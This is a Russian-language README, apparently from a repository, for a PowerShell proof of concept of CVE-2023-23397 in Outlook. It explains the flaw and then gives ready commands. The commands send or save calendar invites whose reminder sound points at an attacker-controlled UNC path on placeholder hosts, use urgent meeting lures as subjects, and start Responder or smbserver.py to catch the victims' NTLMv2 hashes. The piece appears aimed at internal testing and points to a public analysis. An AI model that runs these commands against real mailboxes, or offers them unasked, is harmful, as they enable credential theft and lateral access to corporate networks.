# CVE-2023-23397-PoC-PowerShell
**POC for CVE-2023-23397**

Критическая уязвимость в наборе приложений Microsoft Outlook 365 активно используется в дикой природе и требует срочного исправления. Ошибка CVE-2023-23397 с рейтингом CVSS 9.8, позволяет удаленному злоумышленнику, не прошедшему проверку подлинности, взломать системы, просто отправив специально созданное электронное письмо, которое создаст условия для кражи учетных данных получателя.

В ситуации, когда злоумышленник имеет доступ к локальной сети жертвы, также возможно прямое использование хэша NTLMv2 для входа в другие сервисы без необходимости его взлома. Для проведения атаки жертве достаточно получить электронное письмо, содержащее специально созданное событие календаря или задачу, которая будет ссылаться на путь UNC, контролируемый злоумышленником. Взаимодействие с пользователем не требуется. Атака может быть осуществлена дистанционно.
Полученный доменный пароль можно использовать для входа в другие общедоступные сервисы компании, например, VPN. Если двухфакторная аутентификация не используется, это может привести к тому, что злоумышленник получит доступ к корпоративной сети.

**Все версии Microsoft Outlook для платформы Windows уязвимы** и специалисты рекомендуют немедленно обновить клиенты Outlook в соответствии с рекомендациями. В дополнении Microsoft выпустила сценарий Powershell, который позволяет проверить, получали ли пользователи в вашей организации сообщения, позволяющие использовать уязвимость.

Если инструмент показывает объекты с внешними UNC-путями, возможно, ваша компания подверглась атаке и не лишним будет воспользоваться этим инструментом администраторам серверов Exchange. Доподлинно известно, что уязвимость активно использовалась в атаках одной из APT-группировок как минимум с апреля 2022 года, а учитывая, что детали уязвимости уже описаны публично ожидается рост массовых атак с ее использованием в ближайшие время.

Разбор читать тут https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/

**!Данный скрипт не предназначен для нанесения вреда, только для проверки работоспособности уязвимости внутри Вашей компании!**

**Sending:**
```
Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\XX.XX.XX.XX\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local@80\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Send-CalendarNTLMLeak -recipient "a.galichev@domain.kz" -remotefilepath "\\fakeserver.domain.local@SSL@443\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
```
**Saving:**
```
Save-CalendarNTLMLeak -remotefilepath "\\XX.XX.XX.XX\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local\notexists\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local@80\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
Save-CalendarNTLMLeak -remotefilepath "\\fakeserver.domain.local@SSL@443\sound.wav" -meetingsubject "Срочно! Митинг с руководителем компании" -meetingbody "Вас только что жахнули, Ваши хеши протекли..."
```
**Listening:**
```
sudo smbserver.py -smb2support smb ./smb
//or
sudo python3 Responder.py -i XX.XX.XX.XX -I utun5 -wPv
```
